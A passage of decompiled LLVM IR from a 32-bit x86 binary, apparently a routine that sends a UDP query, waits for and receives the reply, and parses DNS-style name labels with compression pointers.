  %v3_804fdc1 = call i32 @function_8052670(i32 %v2_804fdb9, i32 16)
  store i32 %v3_804fdc1, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804fe09 = load i32, i32* @edi, align 4
  %v1_804fe09 = add i32 %v0_804fe09, 1
  %v2_804fe09 = inttoptr i32 %v1_804fe09 to i16*
  store i16 256, i16* %v2_804fe09, align 2
  %v0_804fe12 = load i32, i32* @ebx, align 4
  %v1_804fe12 = add i32 %v0_804fe12, 2
  %v2_804fe12 = inttoptr i32 %v1_804fe12 to i16*
  store i16 256, i16* %v2_804fe12, align 2
  %v0_804fe18 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804fe18 = icmp eq i32 %v0_804fe18, -1
  br i1 %v10_804fe18, label %dec_label_pc_804fe2c.preheader, label %dec_label_pc_804fe20

dec_label_pc_804fe20.loopexit:                    ; preds = %dec_label_pc_804ff45
  %v0_804fe23.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804fe20

dec_label_pc_804fe20:                             ; preds = %dec_label_pc_804fe20.loopexit, %dec_label_pc_804fd3a
  %v0_804fe23 = phi i32 [ %v0_804fe23.pre, %dec_label_pc_804fe20.loopexit ], [ %v0_804fe18, %dec_label_pc_804fd3a ]
  %v0_804fe20 = load i32, i32* @esp, align 4
  %v2_804fe23 = add i32 %v0_804fe20, -16
  %v3_804fe23 = inttoptr i32 %v2_804fe23 to i32*
  store i32 %v0_804fe23, i32* %v3_804fe23, align 4
  %v1_804fe24 = call i32 @function_8052b81(i32 1)
  store i32 %v1_804fe24, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe2c.preheader

dec_label_pc_804fe2c.preheader:                   ; preds = %dec_label_pc_804fe20, %dec_label_pc_804fd3a
  br label %dec_label_pc_804fe2c

dec_label_pc_804fe2c:                             ; preds = %dec_label_pc_804fe2c.preheader, %dec_label_pc_804ff45
  %v0_804fe2c = load i32, i32* @ebx, align 4
  %v1_804fe2c = load i32, i32* @esp, align 4
  %v2_804fe2c = add i32 %v1_804fe2c, -4
  %v3_804fe2c = inttoptr i32 %v2_804fe2c to i32*
  store i32 %v0_804fe2c, i32* %v3_804fe2c, align 4
  %v1_804fe2d = add i32 %v1_804fe2c, -8
  %v2_804fe2d = inttoptr i32 %v1_804fe2d to i32*
  store i32 0, i32* %v2_804fe2d, align 4
  %v1_804fe2f = add i32 %v1_804fe2c, -12
  %v2_804fe2f = inttoptr i32 %v1_804fe2f to i32*
  store i32 2, i32* %v2_804fe2f, align 4
  %v1_804fe31 = add i32 %v1_804fe2c, -16
  %v2_804fe31 = inttoptr i32 %v1_804fe31 to i32*
  store i32 2, i32* %v2_804fe31, align 4
  %v3_804fe33 = call i32 @function_8053375(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804fe33, i32* %eax.global-to-local, align 4
  %v0_804fe38 = load i32, i32* @esp, align 4
  store i32 %v3_804fe33, i32* @ebp, align 4
  %v10_804fe3d = icmp eq i32 %v3_804fe33, -1
  br i1 %v10_804fe3d, label %dec_label_pc_804ff60, label %dec_label_pc_804fe46

dec_label_pc_804fe46:                             ; preds = %dec_label_pc_804fe2c
  %v0_804fe46 = load i32, i32* @ecx, align 4
  %v2_804fe46 = add i32 %v0_804fe38, 12
  %v3_804fe46 = inttoptr i32 %v2_804fe46 to i32*
  store i32 %v0_804fe46, i32* %v3_804fe46, align 4
  %v1_804fe47 = add i32 %v0_804fe38, 8
  %v2_804fe47 = inttoptr i32 %v1_804fe47 to i32*
  store i32 16, i32* %v2_804fe47, align 4
  %v1_804fe49 = add i32 %v0_804fe38, 4272
  store i32 %v1_804fe49, i32* @edi, align 4
  %v2_804fe50 = add i32 %v0_804fe38, 4
  %v3_804fe50 = inttoptr i32 %v2_804fe50 to i32*
  store i32 %v1_804fe49, i32* %v3_804fe50, align 4
  %v3_804fe51 = inttoptr i32 %v0_804fe38 to i32*
  store i32 %v3_804fe33, i32* %v3_804fe51, align 4
  %v3_804fe52 = call i32 @function_805319a(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fe57 = load i32, i32* @esp, align 4
  %v1_804fe5a = add i32 %v3_804fe52, 1
  %v8_804fe5a = icmp eq i32 %v1_804fe5a, 0
  store i32 %v1_804fe5a, i32* %eax.global-to-local, align 4
  br i1 %v8_804fe5a, label %dec_label_pc_804ff60, label %dec_label_pc_804fe61

dec_label_pc_804fe61:                             ; preds = %dec_label_pc_804fe46
  %v1_804fe61 = add i32 %v0_804fe57, 12
  %v2_804fe61 = inttoptr i32 %v1_804fe61 to i32*
  store i32 16384, i32* %v2_804fe61, align 4
  %v1_804fe66 = add i32 %v0_804fe57, 20
  %v2_804fe66 = inttoptr i32 %v1_804fe66 to i32*
  %v3_804fe66 = load i32, i32* %v2_804fe66, align 4
  store i32 %v3_804fe66, i32* %edx.global-to-local, align 4
  %v2_804fe6a = add i32 %v0_804fe57, 8
  %v3_804fe6a = inttoptr i32 %v2_804fe6a to i32*
  store i32 %v3_804fe66, i32* %v3_804fe6a, align 4
  %v1_804fe6b = add i32 %v0_804fe57, 2096
  store i32 %v1_804fe6b, i32* %eax.global-to-local, align 4
  %v2_804fe72 = add i32 %v0_804fe57, 4
  %v3_804fe72 = inttoptr i32 %v2_804fe72 to i32*
  store i32 %v1_804fe6b, i32* %v3_804fe72, align 4
  %v0_804fe73 = load i32, i32* @ebp, align 4
  %v3_804fe73 = inttoptr i32 %v0_804fe57 to i32*
  store i32 %v0_804fe73, i32* %v3_804fe73, align 4
  %v0_804fe74 = call i32 @function_80532c4()
  %v0_804fe79 = load i32, i32* @esp, align 4
  %v1_804fe7c = add i32 %v0_804fe74, 1
  %v8_804fe7c = icmp eq i32 %v1_804fe7c, 0
  store i32 %v1_804fe7c, i32* %eax.global-to-local, align 4
  br i1 %v8_804fe7c, label %dec_label_pc_804ff60, label %dec_label_pc_804fe83

dec_label_pc_804fe83:                             ; preds = %dec_label_pc_804fe61
  %v2_804fe83 = add i32 %v0_804fe79, 12
  %v3_804fe83 = inttoptr i32 %v2_804fe83 to i32*
  store i32 %v1_804fe7c, i32* %v3_804fe83, align 4
  %v1_804fe84 = add i32 %v0_804fe79, 8
  %v2_804fe84 = inttoptr i32 %v1_804fe84 to i32*
  store i32 0, i32* %v2_804fe84, align 4
  %v0_804fe86 = load i32, i32* @ebp, align 4
  %v2_804fe86 = add i32 %v0_804fe79, 4
  %v3_804fe86 = inttoptr i32 %v2_804fe86 to i32*
  store i32 %v0_804fe86, i32* %v3_804fe86, align 4
  %v2_804fe87 = inttoptr i32 %v0_804fe79 to i32*
  store i32 3, i32* %v2_804fe87, align 4
  %v3_804fe89 = call i32 @function_8052abd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fe8e = load i32, i32* @esp, align 4
  %v12_804fe91 = or i32 %v3_804fe89, 2048
  store i32 %v12_804fe91, i32* %eax.global-to-local, align 4
  %v2_804fe94 = add i32 %v0_804fe8e, 8
  %v3_804fe94 = inttoptr i32 %v2_804fe94 to i32*
  store i32 %v12_804fe91, i32* %v3_804fe94, align 4
  %v0_804fe95 = load i32, i32* @ebp, align 4
  %v2_804fe95 = add i32 %v0_804fe8e, 4
  %v3_804fe95 = inttoptr i32 %v2_804fe95 to i32*
  store i32 %v0_804fe95, i32* %v3_804fe95, align 4
  %v2_804fe96 = inttoptr i32 %v0_804fe8e to i32*
  store i32 4, i32* %v2_804fe96, align 4
  %v3_804fe98 = call i32 @function_8052abd(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804fe9d = load i32, i32* @esp, align 4
  %v1_804fe9d = add i32 %v0_804fe9d, 4144
  store i32 %v1_804fe9d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804feab = inttoptr i32 %v1_804fe9d to i8*
  store i32 %v1_804fe9d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804feae = call i8* @_memset(i8* %v1_804feab, i32 0, i32 32)
  %v6_804feae = ptrtoint i8* %v5_804feae to i32
  store i32 %v6_804feae, i32* %ecx.global-to-local, align 4
  %v0_804feb0 = load i32, i32* @ebp, align 4
  %v2_804feb4 = udiv i32 %v0_804feb0, 32
  store i32 %v2_804feb4, i32* @esi, align 4
  %v1_804feb7 = urem i32 %v0_804feb0, 32
  store i32 %v1_804feb7, i32* @ebx, align 4
  %v0_804feba = load i32, i32* @esp, align 4
  %v2_804feba = mul nuw nsw i32 %v2_804feb4, 4
  %v3_804feba = add nuw nsw i32 %v2_804feba, 4144
  %v4_804feba = add i32 %v3_804feba, %v0_804feba
  %v5_804feba = inttoptr i32 %v4_804feba to i32*
  %v6_804feba = load i32, i32* %v5_804feba, align 4
  %v9_804feba = shl i32 1, %v1_804feb7
  %v12_804feba = or i32 %v6_804feba, %v9_804feba
  store i32 %v12_804feba, i32* %v5_804feba, align 4
  %v0_804fec2 = load i32, i32* @esp, align 4
  %v1_804fec2 = add i32 %v0_804fec2, 4288
  %v2_804fec2 = inttoptr i32 %v1_804fec2 to i32*
  store i32 5, i32* %v2_804fec2, align 4
  %v0_804fecd = load i32, i32* @esp, align 4
  %v1_804fecd = add i32 %v0_804fecd, 4292
  %v2_804fecd = inttoptr i32 %v1_804fecd to i32*
  store i32 0, i32* %v2_804fecd, align 4
  %v0_804fed8 = load i32, i32* @esp, align 4
  %v1_804fed8 = inttoptr i32 %v0_804fed8 to i32*
  %v1_804fed9 = add i32 %v0_804fed8, 4288
  store i32 %v1_804fed9, i32* %v1_804fed8, align 4
  %v0_804fee1 = load i32, i32* @ebp, align 4
  %v1_804fee1 = add i32 %v0_804fee1, 1
  store i32 %v1_804fee1, i32* %eax.global-to-local, align 4
  %v1_804fee4 = add i32 %v0_804fed8, -4
  %v2_804fee4 = inttoptr i32 %v1_804fee4 to i32*
  store i32 0, i32* %v2_804fee4, align 4
  %v1_804fee6 = add i32 %v0_804fed8, -8
  %v2_804fee6 = inttoptr i32 %v1_804fee6 to i32*
  store i32 0, i32* %v2_804fee6, align 4
  %v0_804fee8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804fee8 = add i32 %v0_804fed8, -12
  %v3_804fee8 = inttoptr i32 %v2_804fee8 to i32*
  store i32 %v0_804fee8, i32* %v3_804fee8, align 4
  %v0_804fee9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fee9 = add i32 %v0_804fed8, -16
  %v3_804fee9 = inttoptr i32 %v2_804fee9 to i32*
  store i32 %v0_804fee9, i32* %v3_804fee9, align 4
  %v0_804feea = call i32 @function_8052d88()
  store i32 %v0_804feea, i32* %eax.global-to-local, align 4
  %v0_804feef = load i32, i32* @esp, align 4
  %v1_804feef = add i32 %v0_804feef, 32
  %v10_804fef2 = icmp eq i32 %v0_804feea, -1
  br i1 %v10_804fef2, label %dec_label_pc_804ff74, label %dec_label_pc_804fef7

dec_label_pc_804fef7:                             ; preds = %dec_label_pc_804fe83
  %v1_804fef7 = icmp eq i32 %v0_804feea, 0
  br i1 %v1_804fef7, label %dec_label_pc_804ff3e, label %dec_label_pc_804fefb

dec_label_pc_804fefb:                             ; preds = %dec_label_pc_804fef7
  %v1_804fefb = load i32, i32* @esi, align 4
  %v2_804fefb = mul i32 %v1_804fefb, 4
  %v3_804fefb = add i32 %v0_804feef, 4160
  %v4_804fefb = add i32 %v3_804fefb, %v2_804fefb
  %v5_804fefb = inttoptr i32 %v4_804fefb to i32*
  %v6_804fefb = load i32, i32* %v5_804fefb, align 4
  %v7_804fefb = load i32, i32* @ebx, align 4
  %v8_804fefb = urem i32 %v7_804fefb, 32
  %v9_804fefb = shl i32 1, %v8_804fefb
  %v10_804fefb = and i32 %v9_804fefb, %v6_804fefb
  %v11_804fefb = icmp ne i32 %v10_804fefb, 0
  %v1_804ff03 = zext i1 %v11_804fefb to i32
  %v3_804ff03 = and i32 %v0_804feea, -256
  %v4_804ff03 = or i32 %v1_804ff03, %v3_804ff03
  store i32 %v4_804ff03, i32* %eax.global-to-local, align 4
  %v4_804ff06 = icmp eq i1 %v11_804fefb, false
  br i1 %v4_804ff06, label %dec_label_pc_804ff74, label %dec_label_pc_804ff0a

dec_label_pc_804ff0a:                             ; preds = %dec_label_pc_804fefb
  %v2_804ff0a = add i32 %v0_804feef, 28
  %v3_804ff0a = inttoptr i32 %v2_804ff0a to i32*
  store i32 %v4_804ff03, i32* %v3_804ff0a, align 4
  %v0_804ff0b = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff0b = add i32 %v0_804feef, 24
  %v3_804ff0b = inttoptr i32 %v2_804ff0b to i32*
  store i32 %v0_804ff0b, i32* %v3_804ff0b, align 4
  %v1_804ff0c = add i32 %v0_804feef, 20
  %v2_804ff0c = inttoptr i32 %v1_804ff0c to i32*
  store i32 0, i32* %v2_804ff0c, align 4
  %v1_804ff0e = add i32 %v0_804feef, 16
  %v2_804ff0e = inttoptr i32 %v1_804ff0e to i32*
  store i32 0, i32* %v2_804ff0e, align 4
  %v1_804ff10 = add i32 %v0_804feef, 12
  %v2_804ff10 = inttoptr i32 %v1_804ff10 to i32*
  store i32 16384, i32* %v2_804ff10, align 4
  %v1_804ff15 = add i32 %v0_804feef, 8
  %v2_804ff15 = inttoptr i32 %v1_804ff15 to i32*
  store i32 2048, i32* %v2_804ff15, align 4
  %v1_804ff1a = add i32 %v0_804feef, 64
  store i32 %v1_804ff1a, i32* %eax.global-to-local, align 4
  %v2_804ff1e = add i32 %v0_804feef, 4
  %v3_804ff1e = inttoptr i32 %v2_804ff1e to i32*
  store i32 %v1_804ff1a, i32* %v3_804ff1e, align 4
  %v0_804ff1f = load i32, i32* @ebp, align 4
  %v3_804ff1f = inttoptr i32 %v0_804feef to i32*
  store i32 %v0_804ff1f, i32* %v3_804ff1f, align 4
  %v0_804ff20 = call i32 @function_8053281()
  store i32 %v0_804ff20, i32* %eax.global-to-local, align 4
  %v0_804ff25 = load i32, i32* @esp, align 4
  store i32 %v0_804ff20, i32* @ebx, align 4
  %v1_804ff2a = add i32 %v0_804ff25, 56
  %v2_804ff2a = inttoptr i32 %v1_804ff2a to i32*
  %v3_804ff2a = load i32, i32* %v2_804ff2a, align 4
  store i32 %v3_804ff2a, i32* %eax.global-to-local, align 4
  %v2_804ff2e = add i32 %v0_804ff25, 16
  %v3_804ff2e = inttoptr i32 %v2_804ff2e to i32*
  store i32 %v3_804ff2a, i32* %v3_804ff2e, align 4
  %v2_804ff2f = call i32 @function_80525e0(i8* inttoptr (i32 1 to i8*))
  %v1_804ff34 = add i32 %v2_804ff2f, 17
  store i32 %v1_804ff34, i32* %eax.global-to-local, align 4
  %v0_804ff37 = load i32, i32* @esp, align 4
  %v1_804ff37 = add i32 %v0_804ff37, 16
  %v0_804ff3a = load i32, i32* @ebx, align 4
  %v7_804ff3a = icmp ult i32 %v0_804ff3a, %v1_804ff34
  %v1_804ff3c = icmp eq i1 %v7_804ff3a, false
  br i1 %v1_804ff3c, label %dec_label_pc_804ff9a, label %dec_label_pc_804ff3e

dec_label_pc_804ff3e:                             ; preds = %dec_label_pc_804ffc6, %dec_label_pc_804ff9a, %dec_label_pc_804ff0a, %dec_label_pc_804fef7
  %v0_804ff3e = phi i32 [ %v1_804ffb3, %dec_label_pc_804ffc6 ], [ %v1_804ffb3, %dec_label_pc_804ff9a ], [ %v1_804ff37, %dec_label_pc_804ff0a ], [ %v1_804feef, %dec_label_pc_804fef7 ]
  %v1_804ff3e = add i32 %v0_804ff3e, 8
  %v2_804ff3e = inttoptr i32 %v1_804ff3e to i32*
  %v3_804ff3e = load i32, i32* %v2_804ff3e, align 4
  %v12_804ff3e = icmp eq i32 %v3_804ff3e, 5
  br i1 %v12_804ff3e, label %dec_label_pc_804ff74, label %dec_label_pc_804ff45

dec_label_pc_804ff45:                             ; preds = %dec_label_pc_804ff60, %dec_label_pc_804ff3e
  %v3_804ff45 = phi i32 [ %v3_804ff6d, %dec_label_pc_804ff60 ], [ %v3_804ff3e, %dec_label_pc_804ff3e ]
  %v1_804ff4d = phi i32 [ %v1_804ff6a, %dec_label_pc_804ff60 ], [ %v0_804ff3e, %dec_label_pc_804ff3e ]
  %v1_804ff45 = add i32 %v1_804ff4d, 8
  %v2_804ff45 = inttoptr i32 %v1_804ff45 to i32*
  %v1_804ff49 = add i32 %v3_804ff45, 1
  store i32 %v1_804ff49, i32* @edi, align 4
  %v0_804ff4a = load i32, i32* @ebp, align 4
  %v10_804ff4a = icmp eq i32 %v0_804ff4a, -1
  store i32 %v1_804ff49, i32* %v2_804ff45, align 4
  %v1_804ff51 = icmp eq i1 %v10_804ff4a, false
  br i1 %v1_804ff51, label %dec_label_pc_804fe20.loopexit, label %dec_label_pc_804fe2c

dec_label_pc_804ff60:                             ; preds = %dec_label_pc_804fe61, %dec_label_pc_804fe46, %dec_label_pc_804fe2c
  %v0_804ff60.in = phi i32 [ %v0_804fe79, %dec_label_pc_804fe61 ], [ %v0_804fe57, %dec_label_pc_804fe46 ], [ %v0_804fe38, %dec_label_pc_804fe2c ]
  %v2_804ff63 = inttoptr i32 %v0_804ff60.in to i32*
  store i32 1, i32* %v2_804ff63, align 4
  %v1_804ff65 = call i32 @function_8054730(i32 1)
  store i32 %v1_804ff65, i32* %eax.global-to-local, align 4
  %v0_804ff6a = load i32, i32* @esp, align 4
  %v1_804ff6a = add i32 %v0_804ff6a, 16
  %v1_804ff6d = add i32 %v0_804ff6a, 24
  %v2_804ff6d = inttoptr i32 %v1_804ff6d to i32*
  %v3_804ff6d = load i32, i32* %v2_804ff6d, align 4
  %v12_804ff6d = icmp eq i32 %v3_804ff6d, 5
  %v1_804ff72 = icmp eq i1 %v12_804ff6d, false
  br i1 %v1_804ff72, label %dec_label_pc_804ff45, label %dec_label_pc_804ff74

dec_label_pc_804ff74:                             ; preds = %dec_label_pc_804ff60, %dec_label_pc_804ff3e, %dec_label_pc_804fefb, %dec_label_pc_804fe83, %dec_label_pc_804ffd4, %dec_label_pc_804ffdd.backedge
  %v0_804ff74 = phi i32 [ %v0_804ffe2122, %dec_label_pc_804ffd4 ], [ %v0_804ffe2, %dec_label_pc_804ffdd.backedge ], [ %v1_804ff6a, %dec_label_pc_804ff60 ], [ %v0_804ff3e, %dec_label_pc_804ff3e ], [ %v1_804feef, %dec_label_pc_804fefb ], [ %v1_804feef, %dec_label_pc_804fe83 ]
  %v0_804ff77 = load i32, i32* @ebp, align 4
  %v2_804ff77 = add i32 %v0_804ff74, -16
  %v3_804ff77 = inttoptr i32 %v2_804ff77 to i32*
  store i32 %v0_804ff77, i32* %v3_804ff77, align 4
  %v1_804ff78 = call i32 @function_8052b81(i32 1)
  store i32 %v1_804ff78, i32* %eax.global-to-local, align 4
  %v0_804ff7d = load i32, i32* @esp, align 4
  %v1_804ff7d = add i32 %v0_804ff7d, 16
  %v1_804ff80 = inttoptr i32 %v1_804ff7d to i32*
  %v2_804ff80 = load i32, i32* %v1_804ff80, align 4
  store i32 %v2_804ff80, i32* %edx.global-to-local, align 4
  %v1_804ff83 = inttoptr i32 %v2_804ff80 to i8*
  %v2_804ff83 = load i8, i8* %v1_804ff83, align 1
  %v3_804ff83 = icmp eq i8 %v2_804ff83, 0
  br i1 %v3_804ff83, label %dec_label_pc_8050083, label %dec_label_pc_804ff8c

dec_label_pc_804ff8c:                             ; preds = %dec_label_pc_804ff74
  %v2_804ff8c = load i32, i32* %v1_804ff80, align 4
  store i32 %v2_804ff8c, i32* %eax.global-to-local, align 4
  %v1_804ff8f = add i32 %v0_804ff7d, 4300
  %v1_804ff95 = inttoptr i32 %v1_804ff8f to i32*
  %v2_804ff95 = load i32, i32* %v1_804ff95, align 4
  store i32 %v2_804ff95, i32* @ebx, align 4
  %v3_804ff96 = add i32 %v0_804ff7d, 4308
  %v1_804ff97 = inttoptr i32 %v3_804ff96 to i32*
  %v2_804ff97 = load i32, i32* %v1_804ff97, align 4
  store i32 %v2_804ff97, i32* @edi, align 4
  %v3_804ff97 = add i32 %v0_804ff7d, 4312
  %v1_804ff98 = inttoptr i32 %v3_804ff97 to i32*
  %v2_804ff98 = load i32, i32* %v1_804ff98, align 4
  store i32 %v2_804ff98, i32* @ebp, align 4
  ret i32 %v2_804ff8c

dec_label_pc_804ff9a:                             ; preds = %dec_label_pc_804ff0a
  %v1_804ff9a = add i32 %v0_804ff37, 60
  store i32 %v1_804ff9a, i32* %edx.global-to-local, align 4
  %v2_804ff9e = add i32 %v0_804ff37, 40
  %v3_804ff9e = inttoptr i32 %v2_804ff9e to i32*
  store i32 %v1_804ff9a, i32* %v3_804ff9e, align 4
  %v0_804ffa2 = load i32, i32* @esp, align 4
  %v1_804ffa5 = add i32 %v0_804ffa2, 44
  store i32 %v1_804ffa5, i32* %ecx.global-to-local, align 4
  %v2_804ffa9 = add i32 %v0_804ffa2, -16
  %v3_804ffa9 = inttoptr i32 %v2_804ffa9 to i32*
  store i32 %v1_804ffa5, i32* %v3_804ffa9, align 4
  %v2_804ffaa = call i32 @function_80525e0(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804ffaa, i32* %eax.global-to-local, align 4
  %v0_804ffaf = load i32, i32* @esp, align 4
  %v2_804ffaf = add i32 %v2_804ffaa, 65
  %v3_804ffaf = add i32 %v2_804ffaf, %v0_804ffaf
  store i32 %v3_804ffaf, i32* %ecx.global-to-local, align 4
  %v1_804ffb3 = add i32 %v0_804ffaf, 16
  %v1_804ffb6 = add i32 %v0_804ffaf, 30
  %v2_804ffb6 = inttoptr i32 %v1_804ffb6 to i16*
  %v3_804ffb6 = load i16, i16* %v2_804ffb6, align 2
  %v4_804ffb6 = zext i16 %v3_804ffb6 to i32
  %v7_804ffb6 = and i32 %v1_804fe9d, -65536
  %v8_804ffb6 = or i32 %v4_804ffb6, %v7_804ffb6
  store i32 %v8_804ffb6, i32* @edi, align 4
  %v3_804ffbb = add i32 %v0_804ffaf, 48
  %v4_804ffbb = inttoptr i32 %v3_804ffbb to i16*
  %v5_804ffbb = load i16, i16* %v4_804ffbb, align 2
  %v16_804ffbb = icmp eq i16 %v3_804ffb6, %v5_804ffbb
  %v1_804ffc0 = icmp eq i1 %v16_804ffbb, false
  br i1 %v1_804ffc0, label %dec_label_pc_804ff3e, label %dec_label_pc_804ffc6

dec_label_pc_804ffc6:                             ; preds = %dec_label_pc_804ff9a
  %v1_804ffc6 = add i32 %v0_804ffaf, 54
  %v2_804ffc6 = inttoptr i32 %v1_804ffc6 to i16*
  %v3_804ffc6 = load i16, i16* %v2_804ffc6, align 2
  %v4_804ffc6 = zext i16 %v3_804ffc6 to i32
  %v6_804ffc6 = and i32 %v2_804ffaa, -65536
  %v7_804ffc6 = or i32 %v4_804ffc6, %v6_804ffc6
  store i32 %v7_804ffc6, i32* %eax.global-to-local, align 4
  %v4_804ffcb = icmp eq i16 %v3_804ffc6, 0
  br i1 %v4_804ffcb, label %dec_label_pc_804ff3e, label %dec_label_pc_804ffd4

dec_label_pc_804ffd4:                             ; preds = %dec_label_pc_804ffc6
  %v2_804ffd4 = call i16 @llvm.bswap.i16(i16 %v3_804ffc6)
  %v3_804ffd4 = zext i16 %v2_804ffd4 to i32
  %v6_804ffd4 = or i32 %v3_804ffd4, %v6_804ffc6
  store i32 %v6_804ffd4, i32* %eax.global-to-local, align 4
  %v3_804ffd8 = add i32 %v0_804ffaf, 38
  %v4_804ffd8 = inttoptr i32 %v3_804ffd8 to i16*
  store i16 %v2_804ffd4, i16* %v4_804ffd8, align 2
  %v0_804ffdd117 = load i32, i32* @esp, align 4
  %v1_804ffdd118 = add i32 %v0_804ffdd117, 22
  %v2_804ffdd119 = inttoptr i32 %v1_804ffdd118 to i16*
  %v3_804ffdd120 = load i16, i16* %v2_804ffdd119, align 2
  %v4_804ffdd121 = add i16 %v3_804ffdd120, -1
  store i16 %v4_804ffdd121, i16* %v2_804ffdd119, align 2
  %v0_804ffe2122 = load i32, i32* @esp, align 4
  %v1_804ffe2123 = add i32 %v0_804ffe2122, 22
  %v2_804ffe2124 = inttoptr i32 %v1_804ffe2123 to i16*
  %v3_804ffe2125 = load i16, i16* %v2_804ffe2124, align 2
  %v13_804ffe2126 = icmp eq i16 %v3_804ffe2125, -1
  br i1 %v13_804ffe2126, label %dec_label_pc_804ff74, label %dec_label_pc_804ffea

dec_label_pc_804ffea:                             ; preds = %dec_label_pc_804ffd4, %dec_label_pc_804ffdd.backedge
  %v0_804ffe2127 = phi i32 [ %v0_804ffe2, %dec_label_pc_804ffdd.backedge ], [ %v0_804ffe2122, %dec_label_pc_804ffd4 ]
  %v0_804ffea = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ffea, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804fff311 = inttoptr i32 %v0_804ffea to i8*
  %v2_804fff312 = load i8, i8* %v1_804fff311, align 1
  %v3_804fff313 = zext i8 %v2_804fff312 to i32
  %v4_804fff314 = load i32, i32* %eax.global-to-local, align 4
  %v5_804fff315 = and i32 %v4_804fff314, -256
  %v6_804fff316 = or i32 %v5_804fff315, %v3_804fff313
  store i32 %v6_804fff316, i32* %eax.global-to-local, align 4
  %v4_804fff517 = icmp eq i8 %v2_804fff312, 0
  br i1 %v4_804fff517, label %dec_label_pc_805002a, label %dec_label_pc_804fff9.preheader.preheader

dec_label_pc_804fff9.preheader.preheader:         ; preds = %dec_label_pc_804ffea
  %v1_805001e = add i32 %v0_804ffe2127, 32
  br label %dec_label_pc_804fff9.preheader

dec_label_pc_804fff9.preheader:                   ; preds = %dec_label_pc_804fff9.preheader.preheader, %dec_label_pc_80500bc
  %v0_80500c0 = phi i32 [ %v3_80500c0, %dec_label_pc_80500bc ], [ 1, %dec_label_pc_804fff9.preheader.preheader ]
  %v0_80500bd43 = phi i32 [ %v0_80500bd, %dec_label_pc_80500bc ], [ 0, %dec_label_pc_804fff9.preheader.preheader ]
  %v0_805000639 = phi i32 [ %v1_80500bc, %dec_label_pc_80500bc ], [ %v0_804ffea, %dec_label_pc_804fff9.preheader.preheader ]
  %v0_804fff937 = phi i32 [ %v6_804fff3, %dec_label_pc_80500bc ], [ %v6_804fff316, %dec_label_pc_804fff9.preheader.preheader ]
  br label %dec_label_pc_804fff9

dec_label_pc_804fff9:                             ; preds = %dec_label_pc_804fff9.preheader, %dec_label_pc_8050001
  %v0_80500bd = phi i32 [ %v0_80500bd43, %dec_label_pc_804fff9.preheader ], [ 1, %dec_label_pc_8050001 ]
  %v0_80500bc = phi i32 [ %v0_805000639, %dec_label_pc_804fff9.preheader ], [ %v2_8050022, %dec_label_pc_8050001 ]
  %v4_804fff3 = phi i32 [ %v0_804fff937, %dec_label_pc_804fff9.preheader ], [ %v6_8050024, %dec_label_pc_8050001 ]
  %v1_804fff9 = trunc i32 %v4_804fff3 to i8
  %tmp139 = icmp ult i8 %v1_804fff9, -64
  br i1 %tmp139, label %dec_label_pc_80500bc, label %dec_label_pc_8050001

dec_label_pc_8050001:                             ; preds = %dec_label_pc_804fff9
  %v1_8050001 = urem i32 %v4_804fff3, 256
  store i32 %v1_8050001, i32* %eax.global-to-local, align 4
  %v1_8050006 = add i32 %v0_80500bc, 1
  %v2_8050006 = inttoptr i32 %v1_8050006 to i8*
  %v3_8050006 = load i8, i8* %v2_8050006, align 1
  %v4_8050006 = zext i8 %v3_8050006 to i32
  store i32 1, i32* @ebx, align 4
  %v2_8050014 = mul nuw nsw i32 %v1_8050001, 256
  %v2_8050017 = add nsw i32 %v2_8050014, -49152
  %v3_8050017 = or i32 %v4_8050006, %v2_8050017
  store i32 %v3_8050017, i32* %eax.global-to-local, align 4
  %v2_8050022 = add i32 %v1_805001e, %v3_8050017
  store i32 %v2_8050022, i32* %edx.global-to-local, align 4
  %v1_8050024 = inttoptr i32 %v2_8050022 to i8*
  %v2_8050024 = load i8, i8* %v1_8050024, align 1
  %v3_8050024 = zext i8 %v2_8050024 to i32
  %v6_8050024 = or i32 %v3_8050024, %v2_8050017
  store i32 %v6_8050024, i32* %eax.global-to-local, align 4
  %v4_8050026 = icmp eq i8 %v2_8050024, 0
  %v1_8050028 = icmp eq i1 %v4_8050026, false
  br i1 %v1_8050028, label %dec_label_pc_804fff9, label %dec_label_pc_805002a

dec_label_pc_805002a:                             ; preds = %dec_label_pc_80500bc, %dec_label_pc_8050001, %dec_label_pc_804ffea
  %v4_805004623 = phi i32 [ %v6_804fff316, %dec_label_pc_804ffea ], [ %v6_8050024, %dec_label_pc_8050001 ], [ %v6_804fff3, %dec_label_pc_80500bc ]
  %v5_80500e0 = phi i32 [ %v0_804ffea, %dec_label_pc_804ffea ], [ %v2_8050022, %dec_label_pc_8050001 ], [ %v1_80500bc, %dec_label_pc_80500bc ]
  %v1_805002a = phi i32 [ 0, %dec_label_pc_804ffea ], [ 1, %dec_label_pc_8050001 ], [ %v0_80500bd, %dec_label_pc_80500bc ]
  %v0_805002a = phi i32 [ 1, %dec_label_pc_804ffea ], [ %v0_80500c0, %dec_label_pc_8050001 ], [ %v3_80500c0, %dec_label_pc_80500bc ]
  %v2_805002a = add i32 %v1_805002a, %v0_804ffea
  %v2_805002c = add i32 %v2_805002a, %v0_805002a
  store i32 %v2_805002c, i32* @esi, align 4
  %v1_805002f = inttoptr i32 %v2_805002c to i16*
  %v2_805002f = load i16, i16* %v1_805002f, align 2
  %v8_805002f = icmp eq i16 %v2_805002f, 256
  %v1_8050034 = add i32 %v2_805002c, 10
  store i32 %v1_8050034, i32* @edi, align 4
